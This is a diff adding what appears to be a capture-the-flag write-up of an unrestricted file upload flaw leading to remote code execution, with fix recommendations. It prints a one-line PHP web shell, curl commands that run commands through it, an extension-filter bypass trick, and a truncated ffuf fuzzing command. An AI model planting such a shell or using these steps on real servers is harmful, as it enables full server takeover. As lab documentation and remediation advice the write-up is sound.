@@ -1,3 +1,54 @@
+📜 Vulnerability Report Summary
+Title: Unrestricted File Upload → Remote Code Execution (RCE)
+Target: http://REDACTED/upload.php
+Severity: Critical (CVSS: 9.8)
+
+🔍 Findings
+Vulnerability:
+
+The server allowed uploading .phar/.phtml files with embedded PHP code.
+
+Bypassed filters using :: (NTFS Alternate Data Stream) to hide .jpg extension.
+
+Exploit:
+
+Uploaded a fake image (REDACTED) containing PHP code:
+
+php
+<?php system($_GET["cmd"]); ?>
+Executed commands via:
+
+bash
+curl "http://target/profile_images?REDACTDcmd=id"
+Impact:
+
+Full server compromise (read /flag.txt, execute arbitrary commands).
+
+Potential privilege escalation (if running as root).
+
+🛠️ Fix Recommendations
+File Upload Validation:
+
+php
+$allowed = ['jpg', 'png'];
+$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) { die("Only images allowed!"); }
+Disable Dangerous Executables (in Apache/Nginx):
+
+nginx
+location ~ \.(REDACTEDl)$ { deny all; }
+Use Random Filenames (e.g., UUID.jpg) to prevent direct access.
+
+🔎 Evidence
+Command Execution:
+
+bash
+$ curl "http://REDACTED/REDACTED?cmd=cat+/REDACTED.FILE"
+FLAG{EXAMPLE_FLAG}
+
+Exploit Scripts: https://github.com/Devjustice/whitelist_fileupload/tree/main
+
+
 ─$ ffuf -w wordlist.txt:FUZZ \
      -X POST \
      -u http://redacted/upload.php \
